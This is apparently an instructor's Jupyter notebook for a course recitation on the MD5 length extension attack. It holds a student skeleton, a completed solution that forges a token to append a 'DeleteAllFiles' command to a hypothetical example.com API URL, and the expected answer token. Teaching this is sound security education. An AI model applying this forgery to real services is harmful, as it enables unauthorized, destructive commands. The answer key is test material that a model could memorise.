{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Recitation 2",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "Recitation 2\n",
        "============\n",
        "\n",
        "In this recitation, we will perform an MD5 length extention attack. We will use library functions from the pymd5.py file from Canvas, so begin by downloading that and saving it in the same folder as the notebook."
      ],
      "metadata": {
        "id": "1GMBARz1acnM"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "Imagine a web service that allows users to pass multiple commands to a service using URL parameters (the values following the `?`, separated by `&`):\n",
        "\n",
        "https://example.com/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp\n",
        "\n",
        "Here the `user` parameter is the current user, and there can be any number of `command1`, `command2`, etc. parameters to store the various commands sent to the server. The `token` parameter is used to authenticate the command, and is generated using `MD5([user’s 8-character password] + [the rest of the URL starting from user= and ending with the last command])`.\n",
        "\n",
        "Imagine an attacker wants to add a new command parameter, `command3=DeleteAllData`. They cannot simply append it to the query, as that would invalidate the token. They cannot generate a new token from scratch, as they need the user's password. However, they can use a **length extension attack** to extend the existing token with their new command. Your goal is to demonstrate this attack by using the code below to calculate a valid URL with the parameter `command3=DeleteAllData`."
      ],
      "metadata": {
        "id": "PaDspQi-cF2S"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "_NOTE: The code below is what the students will be given_"
      ],
      "metadata": {
        "id": "1f5fNhYQ4Pfp"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import urllib\n",
        "\n",
        "import pymd5\n",
        "\n",
        "url = 'https://example.com/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\n",
        "\n",
        "original_token = '1e755d78dcb4d783b2573b8d04fcc48a'\n",
        "original_query = 'user=admin&command1=ListFiles&command2=NoOp'\n",
        "malicious_extension = '&command3=DeleteAllFiles'\n",
        "\n",
        "# We cannot simply append to the end of the original query, as the original MD5\n",
        "# hash is based off the assumption that the message ends there, and some padding\n",
        "# has been added at the end. We will have to calculate that padding, and add it\n",
        "# before our malicious extension. This padding is based off the original message\n",
        "# length, so we need to calculate that first.\n",
        "\n",
        "# We need to account for the user's 8-character password, which we do not see,\n",
        "# as well as the length of the query which we do!\n",
        "original_message_length = ...\n",
        "# The padding is based off the length in *bits*, not *bytes*, so we will have to\n",
        "# convert when calculating it.\n",
        "message_padding = pymd5.padding(...)\n",
        "\n",
        "# The total message length includes both the original message, and the padding,\n",
        "# and is also in *bits*!\n",
        "total_message_length = ...\n",
        "\n",
        "# We now have enough information to recreate the state of the hash function at\n",
        "# the point where it left off originally, and we can add on \n",
        "h = pymd5.md5(state=bytes.fromhex(original_token), count=total_message_length)\n",
        "\n",
        "# We can now calculate the hash H(m + a), where m is the orignal message (plus\n",
        "# padding!) and a is any new text that needs to be added.\n",
        "h.update(...)\n",
        "\n",
        "updated_token = h.hexdigest()\n",
        "\n",
        "# We now need to put them all back together into a final URL, in the same form\n",
        "# as the orignal.\n",
        "updated_query = ...\n",
        "\n",
        "print('https://example.com/api?{}'.format(updated_query))"
      ],
      "metadata": {
        "id": "zKfsRGfk3jWN",
        "outputId": "df8c71cc-859e-4cba-8119-29412dd22a77",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 374
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ModuleNotFoundError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-3-100745ab03d2>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0murllib\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mpymd5\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0murl\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'https://example.com/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'pymd5'",
            "",
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"
          ],
          "errorDetails": {
            "actions": [
              {
                "action": "open_url",
                "actionText": "Open Examples",
                "url": "/notebooks/snippets/importing_libraries.ipynb"
              }
            ]
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import urllib\n",
        "\n",
        "import pymd5\n",
        "\n",
        "url = 'https://example.com/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\n",
        "\n",
        "token = '1e755d78dcb4d783b2573b8d04fcc48a'\n",
        "original_query = 'user=admin&command1=ListFiles&command2=NoOp'\n",
        "malicious_extension = '&command3=DeleteAllFiles'\n",
        "\n",
        "original_message_length = 8 + len(original_query) \n",
        "message_padding = pymd5.padding(original_message_length * 8)\n",
        "\n",
        "new_message_length = (original_message_length + len(message_padding)) * 8\n",
        "\n",
        "h = pymd5.md5(state=bytes.fromhex(token), count=new_message_length)\n",
        "h.update(malicious_extension)\n",
        "updated_token = h.hexdigest()\n",
        "\n",
        "updated_query = 'token={updated_token}&{original_query}{padding}{malicious_extension}'.format(\n",
        "    updated_token=updated_token,\n",
        "    original_query=original_query,\n",
        "    padding=urllib.parse.quote(message_padding),\n",
        "    malicious_extension=malicious_extension,\n",
        ")\n",
        "\n",
        "print('https://example.com/api?{}'.format(updated_query))"
      ],
      "metadata": {
        "id": "BG1F3Kf3w62y",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 374
        },
        "outputId": "0d86c922-fb64-4011-abac-8066be5aa970"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "ModuleNotFoundError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-4-d69f73d0827b>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0murllib\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mpymd5\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0murl\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'https://example.com/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'pymd5'",
            "",
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0;32m\nNOTE: If your import is failing due to a missing package, you can\nmanually install dependencies using either !pip or !apt.\n\nTo view examples of installing some common dependencies, click the\n\"Open Examples\" button below.\n\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n"
          ],
          "errorDetails": {
            "actions": [
              {
                "action": "open_url",
                "actionText": "Open Examples",
                "url": "/notebooks/snippets/importing_libraries.ipynb"
              }
            ]
          }
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "The correct answer should have a token of `d037150d6ddc74fff8db6e4d6d5bbf2`"
      ],
      "metadata": {
        "id": "5PefbHG0wYr6"
      }
    }
  ]
}